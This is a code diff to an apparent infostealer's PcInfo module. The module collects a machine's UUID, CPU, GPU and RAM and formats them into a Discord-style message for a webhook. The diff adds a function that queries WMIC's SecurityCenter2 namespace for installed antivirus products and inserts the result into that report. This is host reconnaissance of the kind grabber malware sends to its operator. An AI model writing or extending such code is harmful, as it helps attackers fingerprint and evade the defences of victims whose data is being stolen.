@@ -15,6 +15,15 @@ class PcInfo:
         except LookupError:
             return "white"
 
+    def getAVSolutions(self) -> str:
+        process = subprocess.run("WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName", shell=True, capture_output=True)
+        if process.returncode == 0:
+            output = process.stdout.decode(errors="ignore").strip().replace("\r\n", "\n").splitlines()
+            if len(output) >= 2:
+                output = output[1:]
+                output = [av.strip() for av in output]
+                return ", ".join(output)
+
     def get_inf(self, webhook):
         computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
         cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
@@ -72,7 +81,8 @@ class PcInfo:
 :wrench: **UUID:** `{uuid}`\n
 <:cpu:1051512676947349525> **CPU:** `{cpu}`
 <:gpu:1051512654591688815> **GPU:** `{gpu}`
-<:ram1:1051518404181368972> **RAM:** `{ram}GB`
+<:ram1:1051518404181368972> **RAM:** `{ram}GB`\n
+:cop: **Antivirus:** `{self.getAVSolutions()}`
 '''
                         }
                     ],
